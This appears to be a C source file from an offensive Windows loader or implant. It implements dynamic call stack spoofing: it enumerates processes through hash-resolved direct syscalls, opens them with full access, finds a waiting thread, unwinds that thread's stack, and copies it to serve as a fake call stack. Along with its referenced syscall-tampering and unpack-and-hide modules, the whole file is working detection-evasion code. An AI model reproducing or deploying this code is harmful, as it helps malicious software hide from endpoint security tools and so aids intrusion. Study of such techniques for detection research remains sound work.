#include <Windows.h>
#include <psapi.h>  

#include "Structures.h"
#include "Utilities.h"
#include "TrapSyscallsTampering.h"
#include "StackSpoofing.h"
#include "DebugMacros.h"

#pragma comment(lib, "psapi.lib")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static fnNtReadVirtualMemory g_pNtReadVirtualMemory = NULL;
static fnNtGetContextThread  g_pNtGetContextThread = NULL;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL InitializeDirectSyscalls(VOID) 
{
    if (!g_pNtReadVirtualMemory) 
        g_pNtReadVirtualMemory = (fnNtReadVirtualMemory)GetNtProcAddress(FNV1A_NtReadVirtualMemory);
    if (!g_pNtGetContextThread) 
        g_pNtGetContextThread = (fnNtGetContextThread)GetNtProcAddress(FNV1A_NtGetContextThread);
	return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

__forceinline PVOID FetchProcessMemoryPointer(IN HANDLE hProcess, IN LPVOID lpTargetAddress) 
{
    PVOID       pvReturn                = NULL;
    SIZE_T      cbNumberOfBytesRead     = 0x00;
    NTSTATUS    STATUS                  = STATUS_SUCCESS;

    INVOKE_SYSCALL(FNV1A_NtReadVirtualMemory, STATUS, hProcess, lpTargetAddress, &pvReturn, sizeof(PVOID), &cbNumberOfBytesRead);

    return pvReturn;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL CheckIfAddressIsWithinTargetFunc(IN PVOID pvTargetAddress, IN DWORD dwTargetModule, IN DWORD dwTargetFunction)
{
    HMODULE             hModule             = NULL;
    PVOID               pvTargetFunction    = NULL;
    PRUNTIME_FUNCTION   pRuntimeFunction    = NULL;
    DWORD64             dw64ImageBase       = 0x00;
    PVOID               pvFunctionStart     = NULL;
    PVOID               pvFunctionEnd       = NULL;

    if (!(hModule = GetModuleHandleH(dwTargetModule)))
        return FALSE;

    if (!(pvTargetFunction = GetProcAddressH(hModule, dwTargetFunction)))
        return FALSE;
    
    if (!(pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)pvTargetFunction, &dw64ImageBase, NULL)))
        return FALSE;

    pvFunctionStart     = (PBYTE)hModule + pRuntimeFunction->BeginAddress;
    pvFunctionEnd       = (PBYTE)hModule + pRuntimeFunction->EndAddress;

    return (pvTargetAddress > pvFunctionStart && pvTargetAddress < pvFunctionEnd);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL CalculateFunctionStackSize(IN PRUNTIME_FUNCTION pRuntimeFunction, IN DWORD64 dw64ImageBase, OUT PULONG pcbStackSize, OUT PBOOL pbSetsFramePointer, OUT PBOOL pbPushRbp)
{
    PUNWIND_INFO    pUnwindInfo         = NULL;
    ULONG           ulUnwindOp          = 0x00,
                    ulOpInfo            = 0x00,
                    ulIndex             = 0x00,
                    ulFrameOffset       = 0x00;

    if (!pRuntimeFunction || !pcbStackSize) return FALSE;

    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + dw64ImageBase);

    while (ulIndex < pUnwindInfo->CountOfCodes) 
    {
        ulUnwindOp  = pUnwindInfo->UnwindCode[ulIndex].UnwindOp;
        ulOpInfo    = pUnwindInfo->UnwindCode[ulIndex].OpInfo;

        switch (ulUnwindOp) 
        {
            case UWOP_PUSH_NONVOL:
                *pcbStackSize += 8;
                if (pbPushRbp && ulOpInfo == RBP_OP_INFO) *pbPushRbp = TRUE;
                break;

            case UWOP_SAVE_NONVOL:
                ulIndex += 1;
                break;

            case UWOP_ALLOC_SMALL:
                *pcbStackSize += ((ulOpInfo * 8) + 8);
                break;

            case UWOP_ALLOC_LARGE:
                ulIndex += 1;
                ulFrameOffset = pUnwindInfo->UnwindCode[ulIndex].FrameOffset;
                if (ulOpInfo == 0) 
                {
                    ulFrameOffset *= 8;
                }
                else 
                {
                    ulIndex += 1;
                    ulFrameOffset += (pUnwindInfo->UnwindCode[ulIndex].FrameOffset << 16);
                }
                *pcbStackSize += ulFrameOffset;
                break;

            case UWOP_SET_FPREG:
                if (pbSetsFramePointer) *pbSetsFramePointer = TRUE;
                break;

            default:
                return FALSE;
        }

        ulIndex += 1;
    }

    if (pUnwindInfo->Flags & UNW_FLAG_CHAININFO) 
    {
        ulIndex = pUnwindInfo->CountOfCodes;
        if (ulIndex & 1) ulIndex += 1;

        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[ulIndex]);
        return CalculateFunctionStackSize(pRuntimeFunction, dw64ImageBase, pcbStackSize, pbSetsFramePointer, pbPushRbp);
    }

    *pcbStackSize += 0x08;
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

//
// From UnpackAndHide.c 
//
extern BOOL LoadDllViaLdr(IN LPSTR pszDllName, OUT PHANDLE phModule);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL NormalizeAddress(IN HANDLE hProcess, IN PVOID pvRemoteAddress, OUT PVOID* ppvLocalAddress, BOOL bIgnoreExecutables)
{
    MEMORY_BASIC_INFORMATION    MemBasicInfo            = { 0 };
    CHAR                        szModuleName[MAX_PATH]  = { 0 };
    CHAR*                       pFileName               = NULL;
    DWORD                       dwFileNameLength        = 0x00;
    HMODULE                     hModule                 = NULL;
    ULONG64                     ul64Offset              = 0x00;
    SIZE_T                      cbReturnLength          = 0x00;
    NTSTATUS                    STATUS                  = STATUS_SUCCESS;

    if (!ppvLocalAddress) return FALSE;
    
    INVOKE_SYSCALL(FNV1A_NtQueryVirtualMemory, STATUS, hProcess, pvRemoteAddress, MemoryBasicInformation, &MemBasicInfo, sizeof(MEMORY_BASIC_INFORMATION), &cbReturnLength);
    if (!NT_SUCCESS(STATUS))
    {
        DBG_PRINT_A("[!] NtQueryVirtualMemory Failed With Error: 0x%X", STATUS);
        return FALSE;
    }
    
    ul64Offset = (PBYTE)pvRemoteAddress - (PBYTE)MemBasicInfo.AllocationBase;
    
    if (!GetModuleBaseNameA(hProcess, (HMODULE)MemBasicInfo.AllocationBase, szModuleName, sizeof(szModuleName)))
    {
        DBG_PRINT_A("[!] GetModuleBaseNameA Failed With Error: %lu", GetLastError());
        return FALSE;
    }
    
    // Extract Filename From Full Path
    pFileName = strrchr(szModuleName, '\\');
    if (pFileName)
        pFileName++;
    else
        pFileName = szModuleName;  
    
    dwFileNameLength = (DWORD)lstrlenA(pFileName);
    
    if (bIgnoreExecutables) 
    {
        if (dwFileNameLength >= 4 && (*(ULONG*)(pFileName + dwFileNameLength - 4) == 0x6578652E || *(ULONG*)(pFileName + dwFileNameLength - 4) == 0x4558452E))
           return FALSE;
    }

    hModule = GetModuleHandleH(HASH_STRING_A_CI(pFileName));
    
    if (!hModule) 
    {
        if (!LoadDllViaLdr(pFileName, &hModule))
			return FALSE;

        /*
        hModule = LoadLibraryExA(szModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!hModule)
        {
            // DBG_PRINT_A("[-] LoadLibraryExA Failed With Error: %lu", GetLastError());
            return FALSE;
        }
        */
    }
    *ppvLocalAddress = (PBYTE)hModule + ul64Offset;
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL CalculateDynamicStackSize(IN HANDLE hProcess, IN CONTEXT ThreadCtx, OUT PULONG pcbTotalStackSize)
{
    PVOID               pvReturnAddress                 = NULL,
                        pvPreviousReturnAddress         = NULL,
                        pvCurrentChildSP                = NULL,
                        pvStackIndex                    = NULL,
                        pvLocalReturnAddress            = NULL;
    BOOL                bHandledFirstFrame              = FALSE,
                        bFinishedUnwinding              = FALSE,
                        bSetsFramePointer               = FALSE,
                        bPushRbp                        = FALSE;
    PRUNTIME_FUNCTION   pRuntimeFunction                = NULL;
    DWORD64             dw64ImageBase                   = 0x00;
    ULONG               cbFunctionStackSize             = 0x00;
    
    if (!pcbTotalStackSize) return FALSE;

    *pcbTotalStackSize  = 0x00;
    pvCurrentChildSP    = (PVOID)ThreadCtx.Rsp;
    pvStackIndex        = (PVOID)ThreadCtx.Rsp;

    while (!bFinishedUnwinding) 
    {
        if (!bHandledFirstFrame) 
        {
            pvReturnAddress         = (PVOID)ThreadCtx.Rip;
            bHandledFirstFrame      = TRUE;
        }
        else 
        {
            pvPreviousReturnAddress     = pvReturnAddress;
            pvReturnAddress             = FetchProcessMemoryPointer(hProcess, pvStackIndex);
        }

        if (pvReturnAddress == NULL) 
        {
            if (!CheckIfAddressIsWithinTargetFunc(pvPreviousReturnAddress, FNV1A_NTDLL, FNV1A_RtlUserThreadStart))
                return FALSE;

            bFinishedUnwinding = TRUE;
        }
        else 
        {
            if (!NormalizeAddress(hProcess, pvReturnAddress, &pvLocalReturnAddress, TRUE)) 
                return FALSE;

            if (!(pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)pvLocalReturnAddress, &dw64ImageBase, NULL)))
                return FALSE;

            cbFunctionStackSize = 0x00;
            bSetsFramePointer   = FALSE;
            bPushRbp            = FALSE;

            if (!CalculateFunctionStackSize(pRuntimeFunction, dw64ImageBase, &cbFunctionStackSize, &bSetsFramePointer, &bPushRbp))
                return FALSE;

            *pcbTotalStackSize      +=  cbFunctionStackSize;
            pvCurrentChildSP        =   (PBYTE)pvCurrentChildSP + cbFunctionStackSize;
            pvStackIndex            =   (PBYTE)pvCurrentChildSP - 0x08;
        }
    }

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL IsThreadAMatch(IN HANDLE hProcess, IN DWORD dwProcessId, IN DWORD dwThreadId, IN OUT PTHREAD_TO_SPOOF pThreadToSpoof) 
{
    HANDLE              hThread                 = NULL;
    CONTEXT             ThreadCtx               = { 0 };
    PVOID               pvReturnAddress         = NULL,
                        pvRemoteStartAddress    = NULL;
    SIZE_T              cbNumberOfBytesRead     = 0x00;
    ULONG               cbTotalStackSize        = 0x00;
    CLIENT_ID           ClientId                = { 0 };
    OBJECT_ATTRIBUTES   ObjectAttr              = { 0 };
    NTSTATUS            STATUS                  = STATUS_SUCCESS;
    BOOL                bResult                 = FALSE;

    if (!pThreadToSpoof) return FALSE;

    if (!g_pNtGetContextThread || !g_pNtReadVirtualMemory)
    {
        if (!InitializeDirectSyscalls())
            return FALSE;

        if (!g_pNtGetContextThread || !g_pNtReadVirtualMemory)
            return FALSE;
    }

    ClientId.UniqueThread   = (HANDLE)(ULONG_PTR)dwThreadId;
    ObjectAttr.Length       = sizeof(OBJECT_ATTRIBUTES);

    INVOKE_SYSCALL(FNV1A_NtOpenThread, STATUS, &hThread, THREAD_ALL_ACCESS, &ObjectAttr, &ClientId);
    if (!NT_SUCCESS(STATUS))
    {
        DBG_PRINT_A("[!] NtOpenThread Failed With Status: 0x%08X", STATUS);
        return FALSE;
    }

    ThreadCtx.ContextFlags = CONTEXT_FULL;

    // Do not use INVOKE_SYSCALL macro here 
    // INVOKE_SYSCALL(FNV1A_NtGetContextThread, STATUS, hThread, &ThreadCtx);
    STATUS = g_pNtGetContextThread(hThread, &ThreadCtx);
    if (!NT_SUCCESS(STATUS))
    {
        DBG_PRINT_A("[!] NtGetContextThread Failed With Status: 0x%08X", STATUS);
        goto _END_OF_FUNC;
    }
    
    if (!ThreadCtx.Rsp) goto _END_OF_FUNC;

    if (!(pvReturnAddress = FetchProcessMemoryPointer(hProcess, (LPVOID)ThreadCtx.Rsp)))
        goto _END_OF_FUNC;

    if (!CheckIfAddressIsWithinTargetFunc(pvReturnAddress, FNV1A_KERNELBASE, FNV1A_WaitForSingleObjectEx))
        goto _END_OF_FUNC;

    if (!CalculateDynamicStackSize(hProcess, ThreadCtx, &cbTotalStackSize))
        goto _END_OF_FUNC;

    INVOKE_SYSCALL(FNV1A_NtQueryInformationThread, STATUS, hThread, ThreadQuerySetWin32StartAddress, &pvRemoteStartAddress, sizeof(PVOID), NULL);
    if (!NT_SUCCESS(STATUS))
    {
        DBG_PRINT_A("[!] NtQueryInformationThread Failed With Status: 0x%08X", STATUS);
        goto _END_OF_FUNC;
    }

    if (!NormalizeAddress(hProcess, pvRemoteStartAddress, &pThreadToSpoof->pvStartAddr, FALSE)) 
        goto _END_OF_FUNC;

    if (!(pThreadToSpoof->pvFakeStackBuffer = LocalAlloc(LPTR, cbTotalStackSize)))
    {
        DBG_PRINT_A("[!] LocalAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

	// Do not use INVOKE_SYSCALL macro here 
    // INVOKE_SYSCALL(FNV1A_NtReadVirtualMemory, STATUS, hProcess, (LPCVOID)ThreadCtx.Rsp, pThreadToSpoof->pvFakeStackBuffer, cbTotalStackSize, &cbNumberOfBytesRead);
    STATUS = g_pNtReadVirtualMemory(hProcess, (LPVOID)ThreadCtx.Rsp, pThreadToSpoof->pvFakeStackBuffer, cbTotalStackSize, &cbNumberOfBytesRead);
    if (!NT_SUCCESS(STATUS))
    {
        DBG_PRINT_A("[!] NtReadVirtualMemory Failed With Status: 0x%08X", STATUS);
        LocalFree(pThreadToSpoof->pvFakeStackBuffer);
        pThreadToSpoof->pvFakeStackBuffer = NULL;
        goto _END_OF_FUNC;
    }


    pThreadToSpoof->dwProcessId                 = dwProcessId;
    pThreadToSpoof->dwThreadId                  = dwThreadId;
    pThreadToSpoof->cbTotalRequiredStackSize    = cbTotalStackSize;
    bResult                                     = TRUE;

_END_OF_FUNC:
    if (hThread) 
        CloseHandle(hThread);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InitialiseDynamicCallStackSpoofing(IN ULONG ulWaitReason, OUT PTHREAD_TO_SPOOF pThreadToSpoof) 
{
    PVOID                       pvBuffer        = NULL;
    ULONG                       cbBufferSize    = 0x00;
    CLIENT_ID                   ClientId        = { 0 };
    OBJECT_ATTRIBUTES           ObjectAttr      = { 0 };
    PSYSTEM_PROCESS_INFORMATION pSystemProcInfo = NULL;
    SYSTEM_THREAD_INFORMATION   ThreadInfo      = { 0 };
    HANDLE                      hProcess        = NULL;
    BOOL                        bIsWow64        = FALSE;
    BOOL                        bResult         = FALSE;
    NTSTATUS                    STATUS          = STATUS_SUCCESS;
    ULONG                       i               = 0x00;

    if (!pThreadToSpoof) return TRUE;

    INVOKE_SYSCALL(FNV1A_NtQuerySystemInformation, STATUS, SystemProcessInformation, NULL, 0x00, &cbBufferSize);
    if (STATUS != STATUS_INFO_LENGTH_MISMATCH)
    {
        DBG_PRINT_A("[!] NtQuerySystemInformation Failed With Status: 0x%08X", STATUS);
        return FALSE;
    }

    if (!(pvBuffer = LocalAlloc(LPTR, cbBufferSize)))
    {
        DBG_PRINT_A("[!] LocalAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    INVOKE_SYSCALL(FNV1A_NtQuerySystemInformation, STATUS, SystemProcessInformation, pvBuffer, cbBufferSize, &cbBufferSize);
    if (!NT_SUCCESS(STATUS))
    {
        DBG_PRINT_A("[!] NtQuerySystemInformation Failed With Status: 0x%08X", STATUS);
        goto _END_OF_FUNC;
    }

    pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)pvBuffer;

    while (pSystemProcInfo && pSystemProcInfo->NextEntryOffset) 
    {
        ClientId.UniqueProcess  = pSystemProcInfo->UniqueProcessId;
        ObjectAttr.Length       = sizeof(OBJECT_ATTRIBUTES);

        INVOKE_SYSCALL(FNV1A_NtOpenProcess, STATUS, &hProcess, PROCESS_ALL_ACCESS, &ObjectAttr, &ClientId);
        if (!NT_SUCCESS(STATUS) || !hProcess)
            goto _NEXT_PROCESS;

        if (IsWow64Process(hProcess, &bIsWow64) && bIsWow64) 
            goto _NEXT_PROCESS;

        // DBG_PRINT_W(L"[i] Inspecting Process: %s | PID: %lu | Threads: %lu", pSystemProcInfo->ImageName.Buffer, HandleToUlong(pSystemProcInfo->UniqueProcessId), pSystemProcInfo->NumberOfThreads);

        for (i = 0; i < pSystemProcInfo->NumberOfThreads; i++) 
        {
            ThreadInfo = pSystemProcInfo->ThreadInfos[i];

            if (ThreadInfo.WaitReason != ulWaitReason) continue;

            if (IsThreadAMatch(hProcess, (DWORD)HandleToUlong(pSystemProcInfo->UniqueProcessId), (DWORD)HandleToUlong(ThreadInfo.ClientId.UniqueThread), pThreadToSpoof))
            {
                DBG_PRINT_A("[*] Successfully Located a Thread Call Stack To Clone!");
                DBG_PRINT_W(L"\t[>] Process: %s", pSystemProcInfo->ImageName.Buffer);
                DBG_PRINT_A("\t[>] PID: %lu | TID: %lu", (DWORD)HandleToUlong(pSystemProcInfo->UniqueProcessId), (DWORD)HandleToUlong(ThreadInfo.ClientId.UniqueThread));
                DBG_PRINT_A("\t[>] Start Address: 0x%p | Stack Size: 0x%lX", pThreadToSpoof->pvStartAddr, pThreadToSpoof->cbTotalRequiredStackSize);
                bResult = TRUE;
                CloseHandle(hProcess);
                goto _END_OF_FUNC;
            }
        }

    _NEXT_PROCESS:
        if (hProcess) 
        {
            CloseHandle(hProcess);
            hProcess = NULL;
        }

        pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pSystemProcInfo + pSystemProcInfo->NextEntryOffset);
    }

    DBG_PRINT_A("[!] Could Not Find A Suitable Thread To Spoof!");

_END_OF_FUNC:
    if (pvBuffer) LocalFree(pvBuffer);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==